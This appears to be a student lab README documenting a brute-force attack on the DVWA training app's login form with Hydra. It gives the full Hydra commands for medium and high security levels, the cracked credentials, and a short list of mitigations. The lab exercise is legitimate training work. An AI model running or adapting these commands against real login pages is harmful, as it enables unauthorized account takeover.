# DVWA Brute Force Attack using Hydra

## 📌 Project Overview
This project demonstrates a brute force attack on DVWA login functionality using Hydra.

## 🎯 Objective
- Perform password brute force attack
- Identify weak credentials
- Analyze authentication security

## 🛠️ Tool Used
- Hydra

## 🌐 Target
http://192.168.114.131/dvwa

---

## ⚙️ Attack Method

### Command Used (Medium Security)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.114.131 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=SESSION; security=medium:F=Username and/or password incorrect."

### Command Used (High Security)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.114.131 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=SESSION; security=high:F=Username and/or password incorrect."

---

## 🔓 Result

✔ Username: admin  
✔ Password: password  

---

## ⚠️ Security Impact
- Unauthorized login access
- Account takeover risk
- Weak authentication system

---

## 🛡️ Mitigation
- Use strong passwords
- Implement account lockout policy
- Enable CAPTCHA
- Use multi-factor authentication (MFA)

 ## 🔍 Security Level Comparison

| Level   | Result |
|--------|--------|
| Medium | Password cracked easily |
| High   | Still vulnerable under certain conditions |
 

---

## 📷 Screenshots
Hydra login page Brute Force attack
`<img width="968" height="298" alt="hydra" src="https://github.com/user-attachments/assets/0b53bf9e-c626-4384-94fd-b3330d9ccd92" />
`

---

## 📚 Learning Outcome
- Practical brute force attack execution
- Understanding authentication weaknesses
- Real-world attack simulation

⚠️ This project is conducted in DVWA lab for educational purposes only.


